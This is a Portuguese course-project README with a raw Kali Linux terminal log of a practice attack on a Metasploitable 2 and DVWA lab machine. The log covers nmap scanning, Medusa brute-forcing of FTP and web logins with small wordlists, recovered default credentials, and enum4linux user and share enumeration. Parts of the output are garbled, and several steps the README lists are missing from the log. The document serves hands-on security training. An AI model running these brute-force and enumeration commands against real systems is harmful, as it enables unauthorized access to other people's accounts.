# Simulando-um-Ataque
Desafio de Projeto

Durante a execução do projeto, utilizei o comando script no Kali Linux para registrar automaticamente todas as ações, comandos e resultados obtidos durante os testes práticos.

O comando script é uma ferramenta nativa do Linux que grava tudo o que aparece no terminal (comandos digitados e respectivas saídas) em um arquivo de texto. Isso garante transparência, rastreabilidade e reprodutibilidade dos experimentos realizados.

Exemplo de uso:
    script nome_do_arquivo.txt

Após executar o comando acima, todas as etapas realizadas no terminal foram gravadas no arquivo medusa_teste.log — incluindo:
    Execução de varredura com nmap para identificar serviços ativos no Metasploitable 2;
    Testes de autenticação e força bruta no FTP utilizando o Medusa e wordlists personalizadas (user.txt e pass.txt);
    Tentativas automatizadas de login em formulários web vulneráveis (DVWA);
    Enumeração de usuários e password spraying no protocolo SMB com o módulo smbnt;
    Validação das credenciais encontradas com acessos autenticados (FTP, SMB e SSH);
    Coleta de informações adicionais com ferramentas complementares (enum4linux, smbclient, etc.).

Ao finalizar o procedimento, usei o comando:
    exit

para encerrar a gravação. Isso gerou o arquivo de log completo com todo o passo a passo documentado automaticamente.


┌──(root㉿kali)-[/home/kali]
└─# nmap -sV 21,22,80,445,193 192.168.57.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 13:54 EDT
Failed to resolve "21,22,80,445,193".
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.57.3
Host is up (0.00029s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login       OpenBSD or Solaris rlogind
514/tcp  open  shell       Netkit rshd
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:12:07:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.66 seconds
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# nmap -sV -p 21,22,80,445,193 192.168.57.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 13:55 EDT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers: No such file or directory (2)
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 192.168.57.3
Host is up (0.00042s latency).

PORT    STATE  SERVICE     VERSION
21/tcp  open   ftp         vsftpd 2.3.4
22/tcp  open   ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open   http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
193/tcp closed srmp
445/tcp open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:12:07:7F (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.43 seconds
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# ftp 192.168.57.3
Connected to 192.168.57.3.
220 (vsFTPd 2.3.4)
Name (192.168.57.3:kali): as
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> 
ftp> 
ftp> exit
421 Timeout.
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# cd          
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# echo -e "user\nmsfadmin\nadmin\root" > user.txt
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# echo -e "123456\nmsfadmin\nqwerty\npassword" > pass.txt
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# ls
pass.txt  user.txt
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# pwd
/root
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# medusa -h 192.168.57.3 -U user.txt -P pass.txt -M ftp -t 6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-24 14:10:49 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: msfadmin (1 of 4 complete)
2025-10-24 14:10:49 ACCOUNT FOUND: [ftp] Host: 192.168.57.3 User: msfadmin Password: msfadmin [SUCCESS]
oot (3 of 3, 2 complete) Password: 123456 (1 of 4 complete) (1 of 1, 0 complete) User: admin
oot (3 of 3, 2 complete) Password: msfadmin (2 of 4 complete)1 of 1, 0 complete) User: admin
oot (3 of 3, 2 complete) Password: qwerty (3 of 4 complete) (1 of 1, 0 complete) User: admin
2025-10-24 14:10:52 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 2 complete) Password: qwerty (1 of 4 complete)
2025-10-24 14:10:52 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-24 14:10:52 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: msfadmin (3 of 4 complete)
2025-10-24 14:10:52 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-24 14:10:52 ACCOUNT CHECK: [ftp] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: password (4 of 4 complete)
oot (3 of 3, 3 complete) Password: password (4 of 4 complete)1 of 1, 0 complete) User: admin
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# ftp 192.168.57.3                                        
Connected to 192.168.57.3.
220 (vsFTPd 2.3.4)
Name (192.168.57.3:kali): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> exit
221 Goodbye.
                                                                                                                                                                      
┌──(root㉿kali)-[~]
└─# cd /home/kali 
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# echo -e "user\nmsfadmin\nadmin\root" > user.txt        
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# echo -e "123456\nmsfadmin\nqwerty\npassword" > pass.txt   
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# medusa -h 192.168.57.3 -U user.txt -P pass.txt -M http\   
> 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-10-24 14:29:42 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (1 of 4 complete)
2025-10-24 14:29:42 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: 123456 [SUCCESS]
2025-10-24 14:29:42 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (1 of 4 complete)
2025-10-24 14:29:42 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: 123456 [SUCCESS]
oot (3 of 3, 2 complete) Password: 123456 (1 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: 123456 [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# medusa -h 192.168.57.3 -U user.txt -P pass.txt -M http -m PAGE:"/dvwa/login.php" -m PAGE: 'username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' tt6 
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
Invalid method: PAGE.
WARNING: WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: password (1 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: password [SUCCESS]
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: msfadmin (1 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: msfadmin [SUCCESS]
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 3 complete) Password: qwerty (2 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: qwerty [SUCCESS]
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: msfadmin (2 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: msfadmin [SUCCESS]
oot (3 of 3, 5 complete) Password: 123456 (1 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: 123456 [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 6 complete) Password: qwerty (3 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: qwerty [SUCCESS]
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 7 complete) Password: 123456 (4 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: 123456 [SUCCESS]
2025-10-24 14:34:19 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 8 complete) Password: 123456 (3 of 4 complete)
2025-10-24 14:34:19 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: 123456 [SUCCESS]
oot (3 of 3, 9 complete) Password: qwerty (2 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: qwerty [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
oot (3 of 3, 10 complete) Password: msfadmin (3 of 4 complete)1 of 1, 0 complete) User: admin
oot Password: msfadmin [SUCCESS]D: [http] Host: 192.168.57.3 User: admin
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:1f:b7:23 brd ff:ff:ff:ff:ff:ff
    inet 192.168.57.4/24 brd 192.168.57.255 scope global dynamic noprefixroute eth0
       valid_lft 589sec preferred_lft 589sec
    inet6 fe80::e516:6800:82ff:7908/64 scope link noprefixroute 
       valid_lft forever preferred_lft forever
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# mmedusa -h192.168.57.3 --U user.txt -P pass.txt -Mhttp --mPAGE:""/dvwa/login.php" -mPAGE: ''username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
2025-10-29 12:17:16 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complet      

Script started on 2025-10-29 12:27:07-04:00 [TERM="xterm-256color" TTY="/dev/pts/1" COLUMNS="166" LINES="34"]
                                                                                                                                                                     ┌──(root㉿kali)-[/home/kali]
└─#immedusa -h192.168.57.3 --U user.txt -P pass.txt -Mhttp --mPAGE:""/dvwa/login.php" -mPAGE: ''username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: qwerty (1 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: qwerty [SUCCESS]
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 2 complete) Password: 123456 (1 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: 123456 [SUCCESS]
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: msfadmin (2 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: msfadmin [SUCCESS]
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 4 complete) Password: password (3 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: password [SUCCESS]
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 5 complete) Password: qwerty (2 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: qwerty [SUCCESS]
oot (3 of 3, 6 complete) Password: 123456 (1 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: 123456 [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
oot (3 of 3, 7 complete) Password: msfadmin (2 of 4 complete)(1 of 1, 0 complete) User: admin
oot Password: msfadmin [SUCCESS]D: [http] Host: 192.168.57.3 User: admin
oot (3 of 3, 8 complete) Password: password (3 of 4 complete)(1 of 1, 0 complete) User: admin
oot Password: password [SUCCESS]D: [http] Host: 192.168.57.3 User: admin
oot (3 of 3, 9 complete) Password: qwerty (4 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: qwerty [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 10 complete) Password: 123456 (4 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: 123456 [SUCCESS]
2025-10-29 12:29:00 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 11 complete) Password: msfadmin (3 of 4 complete)
2025-10-29 12:29:00 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: msfadmin [SUCCESS]
                                                                                                                                                                      
┌──(root㉿kali)-[/home/kali]
└─# mmedusa -h192.168.57.3 --U user.txt -P pass.txt -Mhttp --mPAGE:""/dvwa/login.php" -mPAGE: ''username=^USER^&password=^PASS^&Login=Login' -m 'FAIL=Login failed' -t6
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
WARNING: Invalid method: PAGE.
WARNING: Invalid method: FAIL=Login failed.
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 1 complete) Password: 123456 (1 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: 123456 [SUCCESS]
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 2 complete) Password: password (1 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: password [SUCCESS]
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: 123456 [SUCCESS]
oot (3 of 3, 4 complete) Password: 123456 (1 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: 123456 [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
oot (3 of 3, 5 complete) Password: msfadmin (2 of 4 complete)(1 of 1, 0 complete) User: admin
oot Password: msfadmin [SUCCESS]D: [http] Host: 192.168.57.3 User: admin
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 6 complete) Password: qwerty (3 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: qwerty [SUCCESS]
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: user (1 of 3, 7 complete) Password: msfadmin (4 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: user Password: msfadmin [SUCCESS]
oot (3 of 3, 8 complete) Password: qwerty (3 of 4 complete)3 (1 of 1, 0 complete) User: admin
oot Password: qwerty [SUCCESS]UND: [http] Host: 192.168.57.3 User: admin
2025-10-29 12:34:54 ACCOUNT CHECK: [http] Host: 192.168.57.3 (1 of 1, 0 complete) User: msfadmin (2 of 3, 9 complete) Password: msfadmin (2 of 4 complete)
2025-10-29 12:34:54 ACCOUNT FOUND: [http] Host: 192.168.57.3 User: msfadmin Password: msfadmin [SUCCESS]
                                                                                                           
┌──(root㉿kali)-[/home/kali]
└─# enum4linux -a 192.168.57.3 | tee enum4_output.txt
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Oct 29 13:05:29 2025

 =========================================( Target Information )=========================================
                                                                                                                                                                     
Target ........... 192.168.57.3                                                                                                                                      
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.57.3 )============================
                                                                                                                                                                     
                                                                                                                                                                     
[+] Got domain/workgroup name: WORKGROUP                                                                                                                             
                                                                                                                                                                     
                                                                                                                                                                     
 ================================( Nbtstat Information for 192.168.57.3 )================================
                                                                                                                                                                     
Looking up status of 192.168.57.3                                                                                                                                    
        METASPLOITABLE  <00> -         B <ACTIVE>  Workstation Service
        METASPLOITABLE  <03> -         B <ACTIVE>  Messenger Service
        METASPLOITABLE  <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.57.3 )===================================
                                                                                                                                                                     
                                                                                                                                                                     
[+] Server 192.168.57.3 allows sessions using username '', password ''                                                                                               
                                                                                                                                                                     
                                                                                                                                                                     
 ================================( Getting domain SID for 192.168.57.3 )================================
                                                                                                                                                                     
Domain Name: WORKGROUP                                                                                                                                               
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                                 
                                                                                                                                                                     
                                                                                                                                                                     
 ===================================( OS information on 192.168.57.3 )===================================
                                                                                                                                                                     
                                                                                                                                                                     
[E] Can't get OS info with smbclient                                                                                                                                 
                                                                                                                                                                     
                                                                                                                                                                     
[+] Got OS info for 192.168.57.3 from srvinfo:                                                                                                                       
        METASPLOITABLE Wk Sv PrQ Unx NT SNT metasploitable server (Samba 3.0.20-Debian)                                                                              
        platform_id     :       500
        os version      :       4.9
        server type     :       0x9a03


 =======================================( Users on 192.168.57.3 )=======================================
                                                                                                                                                                     
index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games    Name: games     Desc: (null)                                                                                 
index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody   Name: nobody    Desc: (null)
index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind     Name: (null)    Desc: (null)
index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy    Name: proxy     Desc: (null)
index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog   Name: (null)    Desc: (null)
index: 0x6 RID: 0xbba acb: 0x00000010 Account: user     Name: just a user,111,, Desc: (null)
index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data  Desc: (null)
index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root     Name: root      Desc: (null)
index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news     Name: news      Desc: (null)
index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,,       Desc: (null)
index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin      Name: bin       Desc: (null)
index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail     Name: mail      Desc: (null)
index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd  Name: (null)    Desc: (null)
index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd  Name: (null)    Desc: (null)
index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp     Name: (null)    Desc: (null)
index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon  Name: daemon    Desc: (null)
index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd    Name: (null)    Desc: (null)
index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man     Name: man       Desc: (null)
index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp      Name: lp        Desc: (null)
index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql   Name: MySQL Server,,,   Desc: (null)
index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats   Name: Gnats Bug-Reporting System (admin)        Desc: (null)
index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null)    Desc: (null)
index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup  Name: backup    Desc: (null)
index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin        Name: msfadmin,,,       Desc: (null)
index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null)    Desc: (null)
index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys     Name: sys       Desc: (null)
index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog    Name: (null)    Desc: (null)
index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null)    Desc: (null)
index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,,       Desc: (null)
index: 0x1e RID: 0x434 acb: 0x00000011 Account: list    Name: Mailing List Manager      Desc: (null)
index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc     Name: ircd      Desc: (null)
index: 0x20 RID: 0x4be acb: 0x00000011 Account: ftp     Name: (null)    Desc: (null)
index: 0x21 RID: 0x4c4 acb: 0x00000011 Account: tomcat55        Name: (null)    Desc: (null)
index: 0x22 RID: 0x3f0 acb: 0x00000011 Account: sync    Name: sync      Desc: (null)
index: 0x23 RID: 0x3fc acb: 0x00000011 Account: uucp    Name: uucp      Desc: (null)

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]

 =================================( Share Enumeration on 192.168.57.3 )=================================
                                                                                                                                                                     
                                                                                                                                                                     
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE

[+] Attempting to map shares on 192.168.57.3                                                                                                                         
                                                                                                                                                                     
//192.168.57.3/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                                    
//192.168.57.3/tmp      Mapping: OK Listing: OK Writing: N/A
//192.168.57.3/opt      Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                                       
                                                                                                                                                                     
NT_STATUS_NETWORK_ACCESS_DENIED listing \*                                                                                                                           
